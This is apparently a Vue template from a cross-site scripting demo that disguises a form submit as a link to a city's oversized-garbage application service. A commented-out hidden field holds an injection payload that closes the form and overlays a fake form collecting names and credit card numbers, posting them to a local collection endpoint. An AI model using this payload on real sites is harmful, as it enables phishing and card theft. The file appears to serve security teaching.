<template>
  <div>
    <p>〇〇市の粗大ごみ受付がクレジットカードでできるようになっていた。これは便利です
    <form action="http://localhost:3000/xss/input" method="POST">
      <!-- <input name="name" type="hidden" value='"></form><form style="top:5px; left=5px;position:absolute;z-index:99;background-color:white" action="http://localhost:3333/hoge" method="POST">粗大ごみの受付がクレジットカード対応しました。</br>氏名 <input type="text" name="name"></br>カード番号 <input type="text" name="card"><input value="申し込み" type="submit"></form>'> -->
      <input name="name" type="hidden" value="<input name=&quot;name&quot; value=&quot;myname&quot;>">

      <input style="cursor:pointer;text-decoration:underline;color:blue;border:node;background:transparent;font-size:100%;" type="submit" value="〇〇市粗大ごみ申し込みセンター">
    </form>
  </div>

</template>

